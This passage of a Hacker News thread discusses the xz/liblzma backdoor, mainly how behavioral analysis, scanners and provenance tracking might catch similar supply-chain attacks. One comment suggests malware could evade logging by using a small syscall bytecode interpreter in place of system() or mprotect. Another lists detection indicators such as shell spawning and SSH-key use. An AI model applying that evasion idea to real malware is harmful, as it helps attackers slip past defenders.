href="#39878872">parent</a><span>|</span><a href="#39882237">prev</a><span>|</span><a href="#39879960">next</a><span>|</span><label class="collapse" for="c-39878911">[-]</label><label class="expand" for="c-39878911">[44 more]</label></div><br/><div class="children"><div class="content">I expect a lot of people will be doing a whole lot of thinking along these lines over the next months.<p>Code review? Some kind of behavioral analysis?<p>IMO the call to system() was kind of sloppy, and a binary capabilities scanner could have potentially identified a path to that.</div><br/><div id="39879060" class="c"><input type="checkbox" id="c-39879060" checked=""/><div class="controls bullet"><span class="by">tux3</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39878911">parent</a><span>|</span><a href="#39880705">next</a><span>|</span><label class="collapse" for="c-39879060">[-]</label><label class="expand" for="c-39879060">[19 more]</label></div><br/><div class="children"><div class="content">I think behavioral analysis could be promising. There&#x27;s a lot of weird stuff this code does on startup that any reasonable Debian package on the average install should not be doing in a million years.<p>Games and proprietary software will sometimes ship with DRM protection layers that do insane things in the name of obfuscation, making it hard to distinguish from malware.<p>But (with only a couple exceptions) there&#x27;s no reason for a binary or library in a Debian package to ever try to write the PLT outside of the normal mechanism, to try to overwrite symbols in other modules, to add LD audit hooks on startup, to try to resolve things manually by walking ELF structures, to do anti-debug tricks, or just to have any kind of obfuscation or packing that free software packaged for a distro is not supposed to have.<p>Some of these may be (much) more difficult to detect than others, some might not be realistic. But there are several plausible different ways a scanner could have detected something weird going on in memory during ssh startup.<p>No one wants a Linux antivirus. But I think everyone would benefit from throwing all the behavioral analysis we can come up with at new Debian package uploads. We&#x27;re very lucky someone noticed this one, we may not have the same luck next time.</div><br/><div id="39879234" class="c"><input type="checkbox" id="c-39879234" checked=""/><div class="controls bullet"><span class="by">raggi</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879060">parent</a><span>|</span><a href="#39879691">next</a><span>|</span><label class="collapse" for="c-39879234">[-]</label><label class="expand" for="c-39879234">[4 more]</label></div><br/><div class="children"><div class="content">Except had we been doing that they would have put guards in place to detect it - as they already had guards to avoid the code path when a debugger is attached, to avoid building the payload in when it&#x27;s not one of the target systems, and so on. Their evasion was fairly extensive, so we&#x27;d need many novel dynamic systems to stand a chance, and we&#x27;d have to guard those systems extremely tightly - the author got patches into oss-fuzz as well to &quot;squash false positives&quot;. All in all, adding more arms to the arms race does raise the bar, but the bar they surpassed already demonstrated tenacity, long term thinking, and significant defense and detection evasion efforts.</div><br/><div id="39879399" class="c"><input type="checkbox" id="c-39879399" checked=""/><div class="controls bullet"><span class="by">tux3</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879234">parent</a><span>|</span><a href="#39879691">next</a><span>|</span><label class="collapse" for="c-39879399">[-]</label><label class="expand" for="c-39879399">[3 more]</label></div><br/><div class="children"><div class="content">I broadly agree, but I think we can draw a parallel with the arms race of new exploit techniques versus exploit protection.<p>People still manage to write exploits today, but now you must find an ASLR leak, you must chain enough primitives to work around multiple layers of protection, it&#x27;s generally a huge pain to write exploits compared to the 90s.<p>Today the dynamic detection that we have for Linux packages seems thin to non-existent, like the arms race has not even started yet. I think there is a bit of low-hanging fruit to make attacker lives harder (and some much higher-hanging fruit that would be a real headache).<p>Luckily there is an asymmetry in favor of the defenders (for once). If we create a scanner, we do not _have_ to publish every type of scan it knows how to do. Much like companies fighting spammers and fraud don&#x27;t detail exactly how they catch bad actors. (Or, for another example, I know the Tor project has a similar asymmetry to detect bad relays. They collaborate on their relay scanner internally, but no one externally knows all the details.)</div><br/><div id="39881559" class="c"><input type="checkbox" id="c-39881559" checked=""/><div class="controls bullet"><span class="by">saagarjha</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879399">parent</a><span>|</span><a href="#39879449">next</a><span>|</span><label class="collapse" for="c-39881559">[-]</label><label class="expand" for="c-39881559">[1 more]</label></div><br/><div class="children"><div class="content">This is an arms race that is largely won by attackers, actually. Sophisticated attacks are caught by them sometimes but usually the author has far more knowledge or cleverer tricks than the person implementing the checks, who is limited by their imagination of what they think an attacker might do.</div><br/></div></div><div id="39879449" class="c"><input type="checkbox" id="c-39879449" checked=""/><div class="controls bullet"><span class="by">raggi</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879399">parent</a><span>|</span><a href="#39881559">prev</a><span>|</span><a href="#39879691">next</a><span>|</span><label class="collapse" for="c-39879449">[-]</label><label class="expand" for="c-39879449">[1 more]</label></div><br/><div class="children"><div class="content">Yeah, perhaps something akin to an OSS variant of virustotal&#x27;s multi-vendor analysis. I&#x27;m still not sure it would catch this, but as you say, raising the bar isn&#x27;t something we tend to regret.</div><br/></div></div></div></div></div></div><div id="39879691" class="c"><input type="checkbox" id="c-39879691" checked=""/><div class="controls bullet"><span class="by">robocat</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879060">parent</a><span>|</span><a href="#39879234">prev</a><span>|</span><a href="#39879279">next</a><span>|</span><label class="collapse" for="c-39879691">[-]</label><label class="expand" for="c-39879691">[3 more]</label></div><br/><div class="children"><div class="content">&gt; we may not have the same luck next time<p>If the prior is 1 was out there (this one), the chances that there is 1+ still undetected seems fairly high to me.<p>To behaviourally detect this requires many independent actors to be looking in independent ways(e.g. security researchers, internal teams). Edit: I mean with private code &amp; tests (not open source, nor purchasable antivirus). It&#x27;s not easy to donate to Google Zero. Some of the best funded and most skilled teams seem to be antivirus vendors (and high value person protection). I hate the antivirus industry yet I&#x27;ve been helped by it (the anti-tragedy of the commons).<p>Commonly public detection code (e.g. open source) is likely to be defeated by attackers with a lot of resources.<p>Hard to protect ourselves against countries where the  individuals are safe from prosecution. Even nefarious means like assasination likely only work against individuals and not teams.</div><br/><div id="39881738" class="c"><input type="checkbox" id="c-39881738" checked=""/><div class="controls bullet"><span class="by">bandrami</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879691">parent</a><span>|</span><a href="#39879279">next</a><span>|</span><label class="collapse" for="c-39881738">[-]</label><label class="expand" for="c-39881738">[2 more]</label></div><br/><div class="children"><div class="content">&gt; If the prior is 1<p>That would surprise me greatly</div><br/><div id="39882605" class="c"><input type="checkbox" id="c-39882605" checked=""/><div class="controls bullet"><span class="by">lazyasciiart</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39881738">parent</a><span>|</span><a href="#39879279">next</a><span>|</span><label class="collapse" for="c-39882605">[-]</label><label class="expand" for="c-39882605">[1 more]</label></div><br/><div class="children"><div class="content">I think you’re saying “I would be surprised if there is only 1 exploit like this that already exists” which is what the previous comment was also saying. “If the prior is one” is often used to mean “we know for sure that there is one”.</div><br/></div></div></div></div></div></div><div id="39879279" class="c"><input type="checkbox" id="c-39879279" checked=""/><div class="controls bullet"><span class="by">snnn</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879060">parent</a><span>|</span><a href="#39879691">prev</a><span>|</span><a href="#39879942">next</a><span>|</span><label class="collapse" for="c-39879279">[-]</label><label class="expand" for="c-39879279">[1 more]</label></div><br/><div class="children"><div class="content">&gt; to try to overwrite symbols in other modules, to add LD audit hooks on startup, to try to resolve things manually by walking ELF structures<p>I want to name one thing: when Windows failed to load a DLL because a dependency was missing, it doesn&#x27;t tell you what was missed. To get the information, you have to interact with the DLL loader with low level Windows APIs. In some circumstances Linux apps may also have the need. Like for printing a user friendly error message or recovery from a  non-fatal error. For example, the patchelf tool that is used for building portable python packages.<p>&gt; No one wants a Linux antivirus<p>It is not true. Actually these software are very popular in enterprise settings.</div><br/></div></div><div id="39879942" class="c"><input type="checkbox" id="c-39879942" checked=""/><div class="controls bullet"><span class="by">cryptonector</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879060">parent</a><span>|</span><a href="#39879279">prev</a><span>|</span><a href="#39879341">next</a><span>|</span><label class="collapse" for="c-39879942">[-]</label><label class="expand" for="c-39879942">[1 more]</label></div><br/><div class="children"><div class="content">&gt; But I think everyone would benefit from throwing all the behavioral analysis we can come up with at new Debian package uploads.<p>Why &quot;new uploads&quot; and not also &quot;all existing&quot;?</div><br/></div></div><div id="39879341" class="c"><input type="checkbox" id="c-39879341" checked=""/><div class="controls bullet"><span class="by">ffsm8</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879060">parent</a><span>|</span><a href="#39879942">prev</a><span>|</span><a href="#39881579">next</a><span>|</span><label class="collapse" for="c-39879341">[-]</label><label class="expand" for="c-39879341">[7 more]</label></div><br/><div class="children"><div class="content">&gt; <i>No one wants a Linux antivirus</i><p>ClamAV has been around for a very long time at this point.<p>It&#x27;s just not installed on servers, usually</div><br/><div id="39880126" class="c"><input type="checkbox" id="c-39880126" checked=""/><div class="controls bullet"><span class="by">snnn</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879341">parent</a><span>|</span><a href="#39880226">next</a><span>|</span><label class="collapse" for="c-39880126">[-]</label><label class="expand" for="c-39880126">[1 more]</label></div><br/><div class="children"><div class="content">Does not have to be installed. See this: <a href="https:&#x2F;&#x2F;learn.microsoft.com&#x2F;en-us&#x2F;azure&#x2F;defender-for-cloud&#x2F;concept-agentless-data-collection#how-agentless-scanning-works" rel="nofollow">https:&#x2F;&#x2F;learn.microsoft.com&#x2F;en-us&#x2F;azure&#x2F;defender-for-cloud&#x2F;c...</a><p>A cloud provider can take snapshots of running VMs then run antivirus scan offline to minimize the impact to the customers.<p>Similarly, many applications are containerized and the containers are stateless, we can scan the docker images instead. This approach has been quite mature.</div><br/></div></div><div id="39880226" class="c"><input type="checkbox" id="c-39880226" checked=""/><div class="controls bullet"><span class="by">nwallin</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879341">parent</a><span>|</span><a href="#39880126">prev</a><span>|</span><a href="#39879497">next</a><span>|</span><label class="collapse" for="c-39880226">[-]</label><label class="expand" for="c-39880226">[1 more]</label></div><br/><div class="children"><div class="content">In general, my gut feeling is that I expect the majority ClamAV installations to be configured to scan for Windows viruses in user submitted content. Email, hosting sites, etc.</div><br/></div></div><div id="39879497" class="c"><input type="checkbox" id="c-39879497" checked=""/><div class="controls bullet"><span class="by">kemotep</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879341">parent</a><span>|</span><a href="#39880226">prev</a><span>|</span><a href="#39879818">next</a><span>|</span><label class="collapse" for="c-39879497">[-]</label><label class="expand" for="c-39879497">[1 more]</label></div><br/><div class="children"><div class="content">To say nothing of enterprise EDR&#x2F;XDR solutions that have linux versions. These things aren’t bulletproof but can be 1 layer in your multilayer security posture.</div><br/></div></div><div id="39879818" class="c"><input type="checkbox" id="c-39879818" checked=""/><div class="controls bullet"><span class="by">EasyMark</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879341">parent</a><span>|</span><a href="#39879497">prev</a><span>|</span><a href="#39881579">next</a><span>|</span><label class="collapse" for="c-39879818">[-]</label><label class="expand" for="c-39879818">[3 more]</label></div><br/><div class="children"><div class="content">don&#x27;t most people who use that just use it for scanning incoming email attachments usually?</div><br/><div id="39880191" class="c"><input type="checkbox" id="c-39880191" checked=""/><div class="controls bullet"><span class="by">snnn</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879818">parent</a><span>|</span><a href="#39881579">next</a><span>|</span><label class="collapse" for="c-39880191">[-]</label><label class="expand" for="c-39880191">[2 more]</label></div><br/><div class="children"><div class="content">ClamAV also has a lot of findings when scanning some open source project&#x27;s source code. For example, LLVM project&#x27;s test data.  Because some of the test data are meant to check if a known security bug is fixed, from a antivirus software perspective these data files can be seen as exploits. ClamAV is commonly used. Or, I would suggest adding it to every CI build pipeline. Most time it wouldn&#x27;t have any finding, but it is better than nothing. I would like to offer free help if an open source project has the need to harden their build pipelines and their release process.</div><br/></div></div></div></div></div></div><div id="39881579" class="c"><input type="checkbox" id="c-39881579" checked=""/><div class="controls bullet"><span class="by">cipherzero</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879060">parent</a><span>|</span><a href="#39879341">prev</a><span>|</span><a href="#39880705">next</a><span>|</span><label class="collapse" for="c-39881579">[-]</label><label class="expand" for="c-39881579">[2 more]</label></div><br/><div class="children"><div class="content">Sorry, I&#x27;m unfamiliar with PLT what does stand for?</div><br/><div id="39881646" class="c"><input type="checkbox" id="c-39881646" checked=""/><div class="controls bullet"><span class="by">intelVISA</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39881579">parent</a><span>|</span><a href="#39880705">next</a><span>|</span><label class="collapse" for="c-39881646">[-]</label><label class="expand" for="c-39881646">[1 more]</label></div><br/><div class="children"><div class="content">procedure linkage table</div><br/></div></div></div></div></div></div><div id="39880705" class="c"><input type="checkbox" id="c-39880705" checked=""/><div class="controls bullet"><span class="by">ashishbijlani</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39878911">parent</a><span>|</span><a href="#39879060">prev</a><span>|</span><a href="#39879738">next</a><span>|</span><label class="collapse" for="c-39880705">[-]</label><label class="expand" for="c-39880705">[1 more]</label></div><br/><div class="children"><div class="content">I’ve been building Packj [1] to detect malicious PyPI&#x2F;NPM&#x2F;Ruby&#x2F;PHP&#x2F;etc. dependencies using behavioral analysis. It uses static+dynamic code analysis to scan for indicators of compromise (e.g., spawning of shell, use of SSH keys, network communication, use of decode+eval, etc). It also checks for several metadata attributes to detect bad actors (e.g., typo squatting).<p>1. <a href="https:&#x2F;&#x2F;github.com&#x2F;ossillate-inc&#x2F;packj">https:&#x2F;&#x2F;github.com&#x2F;ossillate-inc&#x2F;packj</a></div><br/></div></div><div id="39879738" class="c"><input type="checkbox" id="c-39879738" checked=""/><div class="controls bullet"><span class="by">londons_explore</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39878911">parent</a><span>|</span><a href="#39880705">prev</a><span>|</span><a href="#39879245">next</a><span>|</span><label class="collapse" for="c-39879738">[-]</label><label class="expand" for="c-39879738">[1 more]</label></div><br/><div class="children"><div class="content">I&#x27;m really surprised they did a call to system() rather than just implement a tiny bytecode interpreter.<p>A bytecode interpreter that can call syscalls can be just a few hundred bytes of code, and means you can avoid calling system() (whose calls might be logged), and avoid calling mprotect to make code executable (also something likely to raise security red flags).<p>The only downside of a bytecode interpreter is the whole of the rest of your malware needs to be compiled to your custom bytecode to get the benefits, and you will take a pretty big performance hit.     Unless you&#x27;re streaming the users webcam, that probably isn&#x27;t an issue tho.</div><br/></div></div><div id="39879245" class="c"><input type="checkbox" id="c-39879245" checked=""/><div class="controls bullet"><span class="by">jnwatson</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39878911">parent</a><span>|</span><a href="#39879738">prev</a><span>|</span><a href="#39880539">next</a><span>|</span><label class="collapse" for="c-39879245">[-]</label><label class="expand" for="c-39879245">[4 more]</label></div><br/><div class="children"><div class="content">The real problem was doing expensive math for every connection. If it had relied on a cookie or some simpler-to-compute pre-filter, no one would have been the wiser.</div><br/><div id="39879569" class="c"><input type="checkbox" id="c-39879569" checked=""/><div class="controls bullet"><span class="by">anarazel</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879245">parent</a><span>|</span><a href="#39880539">next</a><span>|</span><label class="collapse" for="c-39879569">[-]</label><label class="expand" for="c-39879569">[3 more]</label></div><br/><div class="children"><div class="content">The slowdown is actually in the startup of the backdoor, not when it&#x27;s actually performing authentication. Note how in the original report even sshd -h (called in the right environment to circumvent countermeasures) is slow.</div><br/><div id="39881529" class="c"><input type="checkbox" id="c-39881529" checked=""/><div class="controls bullet"><span class="by">klabb3</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879569">parent</a><span>|</span><a href="#39880539">next</a><span>|</span><label class="collapse" for="c-39881529">[-]</label><label class="expand" for="c-39881529">[2 more]</label></div><br/><div class="children"><div class="content">Wow. Given the otherwise extreme sophistication this is such a blunder. I imagine the adversary is tearing their hair out over this. 2-3 years of full time infiltration work down the drain, for probably more than a single person.<p>As for the rest of us, we got lucky. In fact, it’s quite hilarious that some grump who’s thanklessly perf testing other people’s code is like “no like, exploit makes my system slower”.</div><br/><div id="39882344" class="c"><input type="checkbox" id="c-39882344" checked=""/><div class="controls bullet"><span class="by">mitjam</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39881529">parent</a><span>|</span><a href="#39880539">next</a><span>|</span><label class="collapse" for="c-39882344">[-]</label><label class="expand" for="c-39882344">[1 more]</label></div><br/><div class="children"><div class="content">If it was not fulltime work I wonder what else they have been working on with different accounts.</div><br/></div></div></div></div></div></div></div></div><div id="39880539" class="c"><input type="checkbox" id="c-39880539" checked=""/><div class="controls bullet"><span class="by">someguydave</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39878911">parent</a><span>|</span><a href="#39879245">prev</a><span>|</span><a href="#39879260">next</a><span>|</span><label class="collapse" for="c-39880539">[-]</label><label class="expand" for="c-39880539">[5 more]</label></div><br/><div class="children"><div class="content">Dynamic linking was a mistake and should be eliminated</div><br/><div id="39881896" class="c"><input type="checkbox" id="c-39881896" checked=""/><div class="controls bullet"><span class="by">kbenson</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39880539">parent</a><span>|</span><a href="#39881650">next</a><span>|</span><label class="collapse" for="c-39881896">[-]</label><label class="expand" for="c-39881896">[3 more]</label></div><br/><div class="children"><div class="content">That this was dynamically linked is the least interesting thing about it IMO. It was a long term I filtration where they got <i>legitimate</i> commit access to a well used library.<p>If xz was statically linked in some way, or just used as an executa Le to compress something (like the kernel), the same problems exist and no dynamic linking would need to be involved.</div><br/><div id="39882107" class="c"><input type="checkbox" id="c-39882107" checked=""/><div class="controls bullet"><span class="by">Cloudef</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39881896">parent</a><span>|</span><a href="#39881650">next</a><span>|</span><label class="collapse" for="c-39882107">[-]</label><label class="expand" for="c-39882107">[2 more]</label></div><br/><div class="children"><div class="content">Not true, it would be much harder to hook into openssl functions if the final executable was static [1], the only way is that if the openssl function this attack targeted, actually called a function from libxz.<p>[1] <a href="https:&#x2F;&#x2F;sourceware.org&#x2F;glibc&#x2F;wiki&#x2F;GNU_IFUNC" rel="nofollow">https:&#x2F;&#x2F;sourceware.org&#x2F;glibc&#x2F;wiki&#x2F;GNU_IFUNC</a><p>Dynamic loading is relic of the past and cause of many headaches in linux ecosystem, in this case it also just obfuscates the execution path of the code more so you can&#x27;t really rely on the code you are reading. Unfortunately I don&#x27;t think it&#x27;s possible to completely get rid of dynamic loading as some components such as GPU drivers require it, but it should be reduced to minimum.</div><br/><div id="39882316" class="c"><input type="checkbox" id="c-39882316" checked=""/><div class="controls bullet"><span class="by">FeepingCreature</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39882107">parent</a><span>|</span><a href="#39881650">next</a><span>|</span><label class="collapse" for="c-39882316">[-]</label><label class="expand" for="c-39882316">[1 more]</label></div><br/><div class="children"><div class="content">Looking at IFUNC, there never seems to be a reason to allow function loading from a different library than the one the call is in, right? Maybe a restriction like that could be built in. Or just explicitly enumerate the possible substitutions per site.</div><br/></div></div></div></div></div></div><div id="39881650" class="c"><input type="checkbox" id="c-39881650" checked=""/><div class="controls bullet"><span class="by">intelVISA</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39880539">parent</a><span>|</span><a href="#39881896">prev</a><span>|</span><a href="#39879260">next</a><span>|</span><label class="collapse" for="c-39881650">[-]</label><label class="expand" for="c-39881650">[1 more]</label></div><br/><div class="children"><div class="content">yep, but how to reverse such a blunder?</div><br/></div></div></div></div><div id="39879260" class="c"><input type="checkbox" id="c-39879260" checked=""/><div class="controls bullet"><span class="by">raggi</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39878911">parent</a><span>|</span><a href="#39880539">prev</a><span>|</span><a href="#39879842">next</a><span>|</span><label class="collapse" for="c-39879260">[-]</label><label class="expand" for="c-39879260">[1 more]</label></div><br/><div class="children"><div class="content">the call to system is obfuscated, static analysis wouldn&#x27;t see it</div><br/></div></div><div id="39879842" class="c"><input type="checkbox" id="c-39879842" checked=""/><div class="controls bullet"><span class="by">XorNot</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39878911">parent</a><span>|</span><a href="#39879260">prev</a><span>|</span><a href="#39879239">next</a><span>|</span><label class="collapse" for="c-39879842">[-]</label><label class="expand" for="c-39879842">[1 more]</label></div><br/><div class="children"><div class="content">If you think about it this is a data-providence problem though. The exploit was hidden in &quot;test&quot; code which gets included in release code by compiler flags.<p>Now, if there was a proper chain of accountability for data, then this wouldn&#x27;t have been possible to hide the way it is - any amount of pre-processing resulting in the release tarball including derived products of &quot;test&quot; files would be suspicious.<p>The problem is we <i>don&#x27;t</i> actually track data providence like this - no build system does. The most we do is &lt;git hash in&gt; -&gt; &lt;some deterministic bits out&gt;. But we don&#x27;t include the human readable data which explains how that transform happens at enough levels.</div><br/></div></div></div></div><div id="39879960" class="c"><input type="checkbox" id="c-39879960" checked=""/><div class="controls bullet"><span class="by">nurple</span><span>|</span><a href="#39878872">parent</a><span>|</span><a href="#39878911">prev</a><span>|</span><a href="#39878937">next</a><span>|</span><label class="collapse" for="c-39879960">[-]</label><label class="expand" for="c-39879960">[1 more]</label></div><br/><div class="children"><div class="content">I think one interesting corollary here is how the Ken Thompson attack was discovered at PWB[0] because it had a memory performance bug[1].<p><pre><code>  [0] https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;PWB&#x2F;UNIX
  [1] https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=38020792</code></pre></div><br/></div></div><div id="39878937" class="c"><input type="checkbox" id="c-39878937" checked=""/><div class="controls bullet"><span class="by">joeyh</span><span>|</span><a href="#39878872">parent</a><span>|</span><a href="#39879960">prev</a><span>|</span><a href="#39882293">next</a><span>|</span><label class="collapse" for="c-39878937">[-]</label><label class="expand" for="c-39878937">[5 more]</label></div><br/><div class="children"><div class="content">Since a liblzma backdoor could be used to modify compiler packages that are installed on some distributions, it gets right back to a trusting trust attack.<p>Although initial detection via eg strace would be possible, if the backdoor was later removed or went quiescentit would be full trusting trust territory.</div><br/><div id="39879385" class="c"><input type="checkbox" id="c-39879385" checked=""/><div class="controls bullet"><span class="by">ghostpepper</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39878937">parent</a><span>|</span><a href="#39882293">next</a><span>|</span><label class="collapse" for="c-39879385">[-]</label><label class="expand" for="c-39879385">[4 more]</label></div><br/><div class="children"><div class="content">How would this be possible? This backdoor works because lzma is loaded into sshd  (by a roundabout method involving systemd). I don&#x27;t think gcc or clang links lzma.</div><br/><div id="39879685" class="c"><input type="checkbox" id="c-39879685" checked=""/><div class="controls bullet"><span class="by">joeyh</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879385">parent</a><span>|</span><a href="#39879727">next</a><span>|</span><label class="collapse" for="c-39879685">[-]</label><label class="expand" for="c-39879685">[1 more]</label></div><br/><div class="children"><div class="content">dpkg-deb is linked with liblzma</div><br/></div></div><div id="39879727" class="c"><input type="checkbox" id="c-39879727" checked=""/><div class="controls bullet"><span class="by">dist-epoch</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879385">parent</a><span>|</span><a href="#39879685">prev</a><span>|</span><a href="#39879572">next</a><span>|</span><label class="collapse" for="c-39879727">[-]</label><label class="expand" for="c-39879727">[1 more]</label></div><br/><div class="children"><div class="content">When the backdoor is loaded by sshd it could modify the gcc&#x2F;clang install, or some system header file.</div><br/></div></div><div id="39879572" class="c"><input type="checkbox" id="c-39879572" checked=""/><div class="controls bullet"><span class="by">slim</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879385">parent</a><span>|</span><a href="#39879727">prev</a><span>|</span><a href="#39882293">next</a><span>|</span><label class="collapse" for="c-39879572">[-]</label><label class="expand" for="c-39879572">[1 more]</label></div><br/><div class="children"><div class="content">servers hosting gcc binaries are accessed using ssh</div><br/></div></div></div></div></div></div><div id="39882293" class="c"><input type="checkbox" id="c-39882293" checked=""/><div class="controls bullet"><span class="by">geggo98</span><span>|</span><a href="#39878872">parent</a><span>|</span><a href="#39878937">prev</a><span>|</span><a href="#39878940">next</a><span>|</span><label class="collapse" for="c-39882293">[-]</label><label class="expand" for="c-39882293">[1 more]</label></div><br/><div class="children"><div class="content">Using a jump host could help, only allowing port forwarding. Ideally it would be heavily monitored and create a new instance for every connection (e.g., inside a container).<p>The attacker would then be stuck inside the jump host and would have to probe where to connect next. This hopefully would then trigger an alert, causing some suspicion.<p>A shared instance would allow the attacker to just wait for another connection and then follow its traces, without risking triggering an alert by probing.<p>The ideal jump host would allow to freeze the running ssh process on an alert, either with a snapshot (VM based) or checkpointing (container based), so it can be analyzed later.</div><br/></div></div><div id="39878940" class="c"><input type="checkbox" id="c-39878940" checked=""/><div class="controls bullet"><span class="by">rdtsc</span><span>|</span><a href="#39878872">parent</a><span>|</span><a href="#39882293">prev</a><span>|</span><a href="#39879197">next</a><span>|</span><label class="collapse" for="c-39878940">[-]</label><label class="expand" for="c-39878940">[20 more]</label></div><br/><div class="children"><div class="content">At least for some comic relief I&#x27;d like to imagine Jia&#x27;s boss slapping him and saying something like &quot;you idiot, we worked on this for so many years and you couldn&#x27;t have checked for any perf issues?&quot;<p>But seriously, we could have found ourselves with this in all stable repos: RHEL, Debian, Ubuntu, IoT devices 5 years from now and it would have been a much larger shit show.</div><br/><div id="39881405" class="c"><input type="checkbox" id="c-39881405" checked=""/><div class="controls bullet"><span class="by">josephg</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39878940">parent</a><span>|</span><a href="#39879223">next</a><span>|</span><label class="collapse" for="c-39881405">[-]</label><label class="expand" for="c-39881405">[3 more]</label></div><br/><div class="children"><div class="content">This was the backdoor we found. We found the backdoor with performance issues.<p>Whats more likely - that this is the only backdoor like this in linux, or that there are more out there and this is the one we happened to find?<p>I really hope someone is out there testing for all of this stuff in linux:<p>- Look for system() calls in compiled binaries and check all of them<p>- Look for uses of IFUNC - specifically when a library uses IFUNC to replace other functions in the resulting executable<p>- Make a list of all the binaries &#x2F; libraries which don&#x27;t landlock. Grep the sourcecode of all those projects and make sure none of them <i>expect</i> to be using landlock.</div><br/><div id="39881672" class="c"><input type="checkbox" id="c-39881672" checked=""/><div class="controls bullet"><span class="by">saagarjha</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39881405">parent</a><span>|</span><a href="#39879223">next</a><span>|</span><label class="collapse" for="c-39881672">[-]</label><label class="expand" for="c-39881672">[2 more]</label></div><br/><div class="children"><div class="content">All of this was obfuscated. None of this will be detectable with current static analysis techniques.</div><br/><div id="39882081" class="c"><input type="checkbox" id="c-39882081" checked=""/><div class="controls bullet"><span class="by">josephg</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39881672">parent</a><span>|</span><a href="#39879223">next</a><span>|</span><label class="collapse" for="c-39882081">[-]</label><label class="expand" for="c-39882081">[1 more]</label></div><br/><div class="children"><div class="content">IFUNC and landlock could be debugged pretty easily at runtime, just by adding some instrumentation.</div><br/></div></div></div></div></div></div><div id="39879223" class="c"><input type="checkbox" id="c-39879223" checked=""/><div class="controls bullet"><span class="by">djao</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39878940">parent</a><span>|</span><a href="#39881405">prev</a><span>|</span><a href="#39879514">next</a><span>|</span><label class="collapse" for="c-39879223">[-]</label><label class="expand" for="c-39879223">[8 more]</label></div><br/><div class="children"><div class="content">Maybe they didn&#x27;t have time to test? They could have been scrambling to make it into timed releases such as Ubuntu 24.04 or Fedora 40.</div><br/><div id="39879301" class="c"><input type="checkbox" id="c-39879301" checked=""/><div class="controls bullet"><span class="by">raggi</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879223">parent</a><span>|</span><a href="#39881514">next</a><span>|</span><label class="collapse" for="c-39879301">[-]</label><label class="expand" for="c-39879301">[6 more]</label></div><br/><div class="children"><div class="content">There is one possible time pressure involved, which is that libsystemd dropped the liblzma dependency</div><br/><div id="39879874" class="c"><input type="checkbox" id="c-39879874" checked=""/><div class="controls bullet"><span class="by">XorNot</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879301">parent</a><span>|</span><a href="#39881514">next</a><span>|</span><label class="collapse" for="c-39879874">[-]</label><label class="expand" for="c-39879874">[5 more]</label></div><br/><div class="children"><div class="content">Absolutely no intelligence agency would look at a successful compromise where they have a highly positioned agent in an organization like this, and burn them trying to rush an under-developed exploit in that would then become not useful almost immediately (because the liblzma dependency would be dropped next distro upgrade cycle).<p>If you had a human-asset with decision making authority and trust in place, then as funded organization with regular working hours, you&#x27;d simply can the project and start prototyping new potential uses.</div><br/><div id="39880524" class="c"><input type="checkbox" id="c-39880524" checked=""/><div class="controls bullet"><span class="by">nequo</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879874">parent</a><span>|</span><a href="#39880837">next</a><span>|</span><label class="collapse" for="c-39880524">[-]</label><label class="expand" for="c-39880524">[2 more]</label></div><br/><div class="children"><div class="content">Might a time-sensitive high-priority goal override such reasoning? For example, the US presidential election is coming up. Making it into Ubuntu LTS could be worth the risk if valuable government targets are running that.</div><br/><div id="39882010" class="c"><input type="checkbox" id="c-39882010" checked=""/><div class="controls bullet"><span class="by">kijin</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39880524">parent</a><span>|</span><a href="#39880837">next</a><span>|</span><label class="collapse" for="c-39882010">[-]</label><label class="expand" for="c-39882010">[1 more]</label></div><br/><div class="children"><div class="content">Jia Tan tried to get his backdoored XZ into Ubuntu 24.04 just before the freeze, so that makes sense. Now is about the right time to get it into Fedora if he wants to backdoor RHEL 10, too.<p>But I don&#x27;t think valuable government targets are in any hurry to upgrade. I wouldn&#x27;t expect widespread adoption of 24.04, even in the private sector, until well after the U.S. election.<p>By the next election, though, everyone will be running it.<p>Edit: According to another comment [1], there would only have been a short window of vulnerability during which this attack would have worked, due to changes in systemd. This might have increased pressure on the attacker to act 